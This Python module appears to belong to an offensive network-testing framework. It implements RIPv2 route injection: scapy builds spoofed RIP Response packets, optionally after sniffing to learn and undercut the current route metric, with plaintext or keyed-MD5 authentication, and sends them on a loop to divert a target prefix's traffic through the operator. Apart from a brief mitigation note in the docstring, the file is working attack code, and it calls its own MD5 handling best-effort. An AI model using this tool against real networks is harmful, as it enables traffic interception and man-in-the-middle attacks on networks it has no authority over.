"""
rip — RIPv2 Route Injection
ATT&CK: T1565.002-adjacent (routing manipulation) — malicious route advertisement

Advertises a route with a low metric (optionally auto-derived via --probe) to
pull traffic for a target prefix through the operator. Supports RIPv2 plaintext
and keyed-MD5 authentication (RFC 2453 / RFC 2082).

Mitigation: RIPv2 authentication with strong keys, passive interfaces on access
segments, and route filtering / prefix-lists. Prefer authenticated OSPF/EIGRP.
"""

import hashlib
import ipaddress
import struct
import sys

sys.stderr = None
from scapy.all import (  # noqa: E402
    Ether, IP, UDP, RIP, RIPEntry, Raw, sniff, sendp, hexdump,
)
sys.stderr = sys.__stderr__

NAME = "rip"
DESCRIPTION = "RIPv2 route injection with optional plaintext / MD5 authentication"
ATTCK_ID = "T1565.002"

RIP_MCAST_MAC = "01:00:5e:00:00:09"
RIP_MCAST_IP = "224.0.0.9"


def _valid_metric(v):
    iv = int(v)
    if iv < 1 or iv > 16:
        raise ValueError("Metric must be 1-16 (RFC 2453; 16 = unreachable)")
    return iv


def _valid_mask(v):
    if v.isdigit():
        return str(ipaddress.IPv4Network(f"0.0.0.0/{v}").netmask)
    ipaddress.IPv4Address(v)  # validate dotted-decimal
    return v


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help="RIPv2 route injection")
    p.add_argument("-n", "--network", required=True, help="Network to announce")
    p.add_argument("--mask", type=_valid_mask, default="255.255.255.0",
                   help="Netmask (dotted or CIDR prefix, default /24)")
    p.add_argument("-m", "--metric", type=_valid_metric,
                   help="Announced metric (1-16). Ignored when --probe is used")
    p.add_argument("-s", "--spoof-ip", dest="spoof_ip", required=True,
                   help="Spoofed source IP (= injected next-hop)")
    p.add_argument("-d", "--dst-ip", dest="dst_ip", default=RIP_MCAST_IP,
                   help="Destination IP (default multicast 224.0.0.9)")
    p.add_argument("-i", "--iface", required=True, help="Send/sniff interface")
    p.add_argument("--route-tag", type=int, default=0, help="Route tag")
    p.add_argument("--interval", type=float, default=30.0,
                   help="Send interval seconds (default 30, RIP-standard)")
    p.add_argument("--count", type=int, default=0,
                   help="Packets to send (0 = infinite)")
    p.add_argument("--auth-type", choices=["none", "plain", "md5"], default="none")
    p.add_argument("--auth-key", help="Key/password (required if auth-type != none)")
    p.add_argument("--auth-keyid", type=int, default=1, help="MD5 key ID")
    p.add_argument("--probe", action="store_true",
                   help="Sniff first to learn current metric, then inject metric-1")
    p.add_argument("--probe-timeout", type=int, default=35,
                   help="Sniff window for --probe (default 35s > 30s RIP period)")
    p.add_argument("--dry-run", action="store_true",
                   help="Build and print the packet, do not send")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _probe_metric(iface, network, timeout, logger):
    """Sniff RIP Responses, return the lowest metric seen for `network`."""
    logger.info("Probing %s on %s for %ds to learn current metric...",
                network, iface, timeout)
    found = []

    def handler(pkt):
        layer = pkt.getlayer(RIPEntry)
        idx = 0
        while layer:
            try:
                if layer.addr == network:
                    found.append(int(layer.metric))
                    logger.info("  saw %s/%s metric=%s from %s",
                                layer.addr, layer.mask, layer.metric, pkt[IP].src)
            except AttributeError:
                pass
            layer = layer.payload.getlayer(RIPEntry) if hasattr(layer, "payload") else None
            idx += 1
            if idx > 25:
                break

    sniff(iface=iface, filter="udp port 520", timeout=timeout, prn=handler, store=False)
    if not found:
        logger.warning("No matching RIP entry seen. Increase --probe-timeout.")
        return None
    best = min(found)
    logger.info("Lowest observed metric for %s: %d", network, best)
    return best


def _build_auth_plain(auth_key):
    key = auth_key.encode()[:16].ljust(16, b"\x00")
    return struct.pack("!HH", 0xFFFF, 2) + key


def run(args, logger):
    if args.auth_type != "none" and not args.auth_key:
        logger.error("--auth-key is required when --auth-type != none")
        return 1
    if not args.probe and args.metric is None:
        logger.error("Provide -m/--metric or use --probe")
        return 1

    if args.probe:
        current = _probe_metric(args.iface, args.network, args.probe_timeout, logger)
        if current is None:
            logger.error("No reference metric; supply -m manually or retry probe.")
            return 1
        metric = max(1, current - 1)
        logger.info("Auto-selected injected metric=%d (beats current=%d)",
                    metric, current)
    else:
        metric = args.metric

    logger.info("RIP inject | %s/%s metric=%d spoof_src=%s auth=%s",
                args.network, args.mask, metric, args.spoof_ip, args.auth_type)

    rip_entry = RIPEntry(AF="IP", RouteTag=args.route_tag, addr=args.network,
                         mask=args.mask, nextHop="0.0.0.0", metric=metric)

    eth = Ether()
    if args.dst_ip == RIP_MCAST_IP:
        eth.dst = RIP_MCAST_MAC
    ip = IP(dst=args.dst_ip, src=args.spoof_ip)
    udp = UDP(sport=520, dport=520)
    rip_hdr = RIP(cmd=2, version=2)

    if args.auth_type == "none":
        pkt = eth / ip / udp / rip_hdr / rip_entry
    elif args.auth_type == "plain":
        pkt = eth / ip / udp / rip_hdr / Raw(load=_build_auth_plain(args.auth_key)) / rip_entry
    else:  # md5 (RFC 2082 keyed-MD5) — best-effort layout, verify against real traffic
        route_bytes = bytes(rip_entry)
        auth_header = struct.pack("!HHHHII", 0xFFFF, 3, 20 + len(route_bytes),
                                  args.auth_keyid, 16, 1)
        to_digest = (bytes(rip_hdr) + auth_header + route_bytes
                     + args.auth_key.encode().ljust(16, b"\x00"))
        digest = hashlib.md5(to_digest).digest()
        trailer = struct.pack("!HH", 0xFFFF, 1) + digest
        pkt = eth / ip / udp / rip_hdr / Raw(load=auth_header + route_bytes + trailer)
        logger.warning("keyed-MD5 layout is best-effort; verify with Wireshark "
                        "against real authenticated traffic in the lab first.")

    if args.dry_run:
        logger.info("--dry-run: packet will NOT be sent.")
        pkt.show()
        hexdump(pkt)
        return 0

    logger.info("Sending | interval=%ss count=%s",
                args.interval, "infinite" if args.count == 0 else args.count)
    sendp(pkt, loop=(0 if args.count else 1),
          count=(args.count if args.count else 1),
          inter=args.interval, iface=args.iface, verbose=False)
